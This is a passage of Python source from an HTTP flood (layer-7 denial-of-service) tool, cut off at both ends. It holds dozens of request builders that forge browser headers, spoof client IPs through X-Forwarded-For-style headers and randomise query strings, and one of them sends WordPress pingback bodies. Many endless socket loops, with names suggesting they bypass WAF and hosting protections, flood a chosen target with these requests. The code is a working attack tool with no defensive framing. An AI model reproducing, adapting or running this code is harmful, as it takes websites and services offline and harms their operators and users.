    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,\r\nCache-Cotrol:  max-age=0\r\nConnection: keep-alive\r\nDNT: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload11():
    ipt = spo_ip()
    return f'GET {path}?{strm(6)}={strm(6)}={strm(6)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: {che(app)}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nX-Originating-IP: {ipt}\r\nX-Forwarded-For: {ipt}\r\nX-Forwarded: {ipt}\r\nForwarded-For: {ipt}\r\nX-Forwarded-Host: {ipt}\r\nX-Remote-IP: {ipt}\r\nX-Remote-Addr: {ipt}\r\nX-ProxyUser-Ip: {ipt}\r\nX-Original-URL: {ipt}\r\nClient-IP: {ipt}\r\nX-Client-IP: {ipt}\r\nTrue-Client-IP: {ipt}\r\nX-Host: {ipt}\r\nCluster-Client-IP: {ipt}\r\nX-ProxyUser-Ip: {ipt}\r\nVia: 1.0 fred, 1.1 {ipt}\r\n\r\n'.encode()

def generate_payload12():
    return f'POST {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nReferer: {che(reff)}\r\nContent-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n\r\n'.encode()

def generate_payload13():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: {che(app)}\r\nReferer: {che(reff)}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload14():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload15():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Language: en-US;q=0.6\r\nConnection: keep-alive\r\nReferer: {url}\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload16():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US;q=0.6\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload17():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US;q=0.6\r\nConnection: keep-alive\r\nPragma: no-cache\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-User: ?1\r\nUpgrade-Insecure-Requests: ?1\r\nTE: trailers\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload18():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US;q=0.9\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nReferer: {url}\r\nContent-Type: application/x-www-form-urlencoded\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload19():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US;q=0.8,en;q=0.7\r\nConnection: keep-alive\e\nCache-Control: max-age=0\r\nsec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: "Windows"\r\nsec-fetch-dest: empty\r\nsec-fetch-mode: cors\r\nsec-fetch-site: same-origin\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload20():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nReferer: {che(reff)}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nKeep-Alive: 115\r\nConnection: keep-alive\r\n\r\n'.encode()

def generate_payload21():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nCache-Cotrol: no-cache\r\nAccept-Encoding: null\r\nAccept-Language: null\r\n\r\n'.encode()

def generate_payload22():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nKeep-Alive: 115\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nPragma: no-cache\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-User: ?1\r\nsec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: "Windows"\r\nsec-fetch-dest: empty\r\nsec-fetch-mode: cors\r\nsec-fetch-site: same-origin\r\nUpgrade-Insecure-Requests: 1\r\nTE: trailers\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload23():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload24():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nReferer: {target}\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload25():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,\r\nCache-Cotrol: no-cache\r\nConnection: keep-alive\r\nDNT: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode()

def generate_payload26():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,\r\nCache-Cotrol: no-cache\r\nConnection: keep-alive\r\nDNT: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload27():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUser-Agent: {ua}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: no-cache\r\nKeep-Alive: 115\r\nConnection: Keep-Alive\r\n\r\n'.encode()

def generate_payload28():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUser-Agent: {ua}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: no-cache\r\nKeep-Alive: 115\r\nConnection: Keep-Alive\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload29():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nsec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: "Windows"\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload30():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nDNT: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode()

def generate_payload31():
    return f'GET {path} HTTP/1.2\r\nHost: {target}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUser-Agent: {ua}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload32():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7\r\nsec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: "Windows"\r\nsec-fetch-dest: empty\r\nsec-fetch-mode: cors\r\nsec-fetch-site: same-origin\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload33():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload34():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nConnection: keep-alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.5\r\nCache-Control: max-age=0\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload35():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nReffer: {url}\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload36():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.5\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode()

def generate_payload37():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.5\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload38():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nCache-Control: no-cache\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Site: same-origin\r\nSec-GPC: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Dest: document\r\n\r\n'.encode()

def generate_payload39():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Site: same-origin\r\nSec-GPC: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Dest: document\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload40():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload41():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nCache-Control: no-cache\r\nConnection: keep-alive\r\n\r\n'.encode()

def generate_payload42():
    return f'POST {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nReferer: {che(reff)}\r\nContent-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n<?xml version="1.0" encoding="UTF-8"?>\r\n<methodCall>\r\n<methodName>pingback.ping</methodName>\r\n<params>\r\n<param\r\n<value><string>{strm(32)}</string></value>\r\n</param>\r\n<param>\r\n<value><string>{strm(32)}</string></value>\r\n</param>\r\n</params>\r\n</methodCall>\r\n\r\n'.encode()

# <-----------------------LAYER7 ----------------------> #

def raw():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload1()
                s.send(payl)
        except:
            pass

def bypass():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload2()
                s.send(payl)
        except:
            pass

def mix():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload3()
                s.send(payl)
        except:
            pass

def cloud():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload4()
                s.send(payl)
        except:
            pass

def get():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload5()
                s.send(payl)
        except:
            pass

def uam():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload6()
                s.send(payl)
        except:
            pass

def waf():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload7()
                s.send(payl)
        except:
            pass

def ovh():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload8()
                s.send(payl)
        except:
            pass

def onec():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload9()
                s.send(payl)
        except:
            pass

def sky():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload10()
                s.send(payl)
        except:
            pass

def spoof():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload11()
                s.send(payl)
        except:
            pass

def post():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload12()
                s.send(payl)
        except:
            pass

def rawplus():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload13()
                s.send(payl)
        except:
            pass

def high():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload14()
                s.send(payl)
        except:
            pass

def uamplus():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload15()
                s.send(payl)
        except:
            pass

def tls():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload16()
                s.send(payl)
        except:
            pass

def http2():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload17()
                s.send(payl)
        except:
            pass

def gurd():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload18()
                s.send(payl)
        except:
            pass

def kill():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload19()
                s.send(payl)
        except:
            pass

def tlsv2():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload20()
                s.send(payl)
        except:
            pass

def null():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload21()
                s.send(payl)
        except:
            pass

def killplus():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload22()
                s.send(payl)
        except:
            pass

def https():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload23()
                s.send(payl)
        except:
            pass

def ir():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload24()
                s.send(payl)
        except:
            pass

def war():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload25()
                s.send(payl)
        except:
            pass

def warplus():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload26()
                s.send(payl)
        except:
            pass

def zeus():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload27()
                s.send(payl)
        except:
            pass

def bypassplus():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload28()
                s.send(payl)
        except:
            pass

def pro():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload29()
                s.send(payl)
        except:
            pass

def crash():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload30()
                s.send(payl)
        except:
            pass

def httpsplus():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload31()
                s.send(payl)
        except:
            pass

def wafplus():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload32()
                s.send(payl)
        except:
            pass

def storm():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload33()
                s.send(payl)
        except:
            pass

def stormplus():
    while True:
        try:
            if url.split('://')[0] == 'https':
